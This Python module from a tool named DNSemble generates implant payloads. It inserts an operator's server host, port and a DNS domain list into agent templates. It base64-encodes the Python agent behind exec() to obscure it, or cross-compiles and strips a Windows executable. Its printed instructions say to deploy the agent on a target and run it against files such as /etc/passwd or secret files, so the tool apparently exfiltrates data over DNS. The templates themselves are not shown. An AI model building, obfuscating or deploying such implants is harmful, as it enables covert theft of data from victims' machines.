#!/usr/bin/env python3
"""
DNSemble — Payload generation and compilation.
"""

import os
import sys
import subprocess
from pathlib import Path

from core.functions import C, BANNER, banner_kwargs
from core.domains import DOMAINS

TEMPLATES_DIR = Path(__file__).resolve().parent.parent / "templates"

PAYLOADS = {
    "generic/python": {
        "template": "generic_static_python.py",
        "name": "Python 3 Agent",
        "description": "Hardcoded domain list — 1 setup query (session negotiation only)",
        "extension": ".py",
        "wrap_b64": True,
    },
    "windows/c": {
        "template": "windows_static_c.c",
        "name": "Windows C Agent",
        "description": "Hardcoded domain list — 1 setup query (session negotiation only)",
        "extension": ".exe",
        "compile": True,
    },
}


def _domains_py_literal(domains):
    lines = [f"    {d!r}," for d in domains]
    return "[\n" + "\n".join(lines) + "\n]"


def _domains_c_array(domains):
    lines = [f'    "{d}",' for d in domains]
    return "\n".join(lines)


def _find_mingw(arch="x64"):
    if arch == "x86":
        candidates = ["i686-w64-mingw32-gcc"]
    else:
        candidates = ["x86_64-w64-mingw32-gcc"]
    for cc in candidates:
        try:
            subprocess.run([cc, "--version"], capture_output=True, timeout=5)
            return cc
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue
    return None


def _mingw_compile(cc, src, exe):
    r = subprocess.run(
        [cc, "-o", exe, src, "-lws2_32", "-O2", "-s"],
        capture_output=True, text=True, timeout=30,
    )
    if r.returncode != 0:
        return False, r.stderr
    return True, None


def _resolve_payload_key(payload_key):
    if payload_key in PAYLOADS:
        return payload_key
    try:
        idx = int(payload_key)
        keys = list(PAYLOADS.keys())
        if 1 <= idx <= len(keys):
            return keys[idx - 1]
    except ValueError:
        pass
    return None


def generate_payload(payload_key, host, port, jitter, delay, output, arch="x64",
                     embedded_files=None, domains=None):
    resolved = _resolve_payload_key(payload_key)
    if resolved is None:
        print(f"{C.red}[!] Unknown payload: {payload_key}{C.rst}")
        print(f"    Run with --payloads to see available options.")
        sys.exit(1)
    payload_key = resolved

    info = PAYLOADS[payload_key]
    template_path = TEMPLATES_DIR / info["template"]

    if not template_path.is_file():
        print(f"{C.red}[!] Template not found: {template_path}{C.rst}")
        sys.exit(1)

    if info.get("compile"):
        cc = _find_mingw(arch)
        if not cc:
            expected = "i686-w64-mingw32-gcc" if arch == "x86" else "x86_64-w64-mingw32-gcc"
            print(f"{C.red}[!] MinGW cross-compiler not found: {expected}{C.rst}")
            print(f"    Install with: apt install mingw-w64")
            sys.exit(1)

    template = template_path.read_text()
    pool = domains or DOMAINS
    files_list = embedded_files or []

    if info.get("compile"):
        if files_list:
            c_items = ", ".join(f'"{f}"' for f in files_list)
            c_init = "{" + c_items + "}"
        else:
            c_init = "{NULL}"
        c_count = str(len(files_list))
        rendered = (
            template
            .replace("{{EMBEDDED_FILES_INIT}}", c_init)
            .replace("{{EMBEDDED_FILES_COUNT}}", c_count)
            .replace("{{DOMAINS_C_ARRAY}}", _domains_c_array(pool))
        )
    else:
        rendered = (
            template
            .replace("{{EMBEDDED_FILES}}", repr(files_list))
            .replace("{{DOMAINS}}", _domains_py_literal(pool))
        )

    rendered = (
        rendered
        .replace("{{SERVER_HOST}}", host)
        .replace("{{SERVER_PORT}}", str(port))
        .replace("{{JITTER}}", str(int(jitter)))
        .replace("{{DELAY}}", str(int(delay)))
    )

    if info.get("wrap_b64"):
        import base64
        encoded = base64.b64encode(rendered.encode()).decode()
        rendered = (
            "#!/usr/bin/env python3\n"
            f"import base64;exec(base64.b64decode(\"{encoded}\"))\n"
        )

    if output is None:
        safe_host = host.replace(".", "_")
        output = f"dnssemble_agent_{safe_host}_{port}{info['extension']}"

    if info.get("compile"):
        exe_path = output if output.endswith(".exe") else output + ".exe"
        src_path = exe_path[:-4] + ".c"

        with open(src_path, "w") as f:
            f.write(rendered)

        ok, stderr = _mingw_compile(cc, src_path, exe_path)
        os.unlink(src_path)
        if not ok:
            print(f"{C.red}[!] Compilation failed:{C.rst}\n{stderr}")
            sys.exit(1)

        out_path = exe_path
        out_size = os.path.getsize(exe_path)
    else:
        out_path = output
        with open(out_path, "w") as f:
            f.write(rendered)
        os.chmod(out_path, 0o755)
        out_size = len(rendered)

    kw = banner_kwargs()
    print(BANNER.format(**kw))
    bar = f"{C.grn}{'═' * 60}{C.rst}"
    print(bar)
    print(f"  {C.bold}{C.grn}PAYLOAD GENERATED{C.rst}")
    print(bar)
    print(f"  {C.bold}Type{C.rst}       {payload_key} ({info['name']})")
    print(f"  {C.bold}Server{C.rst}     {host}:{port}")
    print(f"  {C.bold}Delay{C.rst}      {int(delay)}ms")
    print(f"  {C.bold}Jitter{C.rst}     ±{int(jitter)}ms")
    print(f"  {C.bold}Domains{C.rst}    {len(pool)} (baked into agent)")
    if info.get("compile"):
        print(f"  {C.bold}Arch{C.rst}       {arch}")
        print(f"  {C.bold}Compiler{C.rst}   {cc}")
        print(f"  {C.bold}Binary{C.rst}     {out_path}")
    else:
        print(f"  {C.bold}Output{C.rst}     {out_path}")
        print(f"  {C.bold}Encoding{C.rst}   base64 + exec()")
    if files_list:
        print(f"  {C.bold}Files{C.rst}      {len(files_list)} embedded")
        for fp in files_list:
            print(f"               {C.dim}→ {fp}{C.rst}")
    print(f"  {C.bold}Size{C.rst}       {out_size} bytes")
    print(bar)

    if files_list:
        if info.get("compile"):
            print(f"\n  {C.dim}Deploy on target and run (embedded files):{C.rst}")
            print(f"  {C.bold}  {os.path.basename(out_path)}{C.rst}")
            print(f"  {C.dim}  Or override:{C.rst}")
            print(f"  {C.bold}  {os.path.basename(out_path)} C:\\other\\file.txt{C.rst}")
        else:
            print(f"\n  {C.dim}Deploy on target and run (embedded files):{C.rst}")
            print(f"  {C.bold}  python3 {out_path}{C.rst}")
            print(f"  {C.dim}  Or override:{C.rst}")
            print(f"  {C.bold}  python3 {out_path} /other/file.txt{C.rst}")
    elif info.get("compile"):
        print(f"\n  {C.dim}Deploy on Windows target and run:{C.rst}")
        print(f"  {C.bold}  {os.path.basename(out_path)} C:\\path\\to\\secret.txt{C.rst}")
        print(f"  {C.bold}  {os.path.basename(out_path)} secret.txt{C.rst}")
    else:
        print(f"\n  {C.dim}Deploy on target and run:{C.rst}")
        print(f"  {C.bold}  python3 {out_path} /etc/passwd{C.rst}")
        print(f"  {C.bold}  python3 {out_path} secret.txt{C.rst}")
    print()
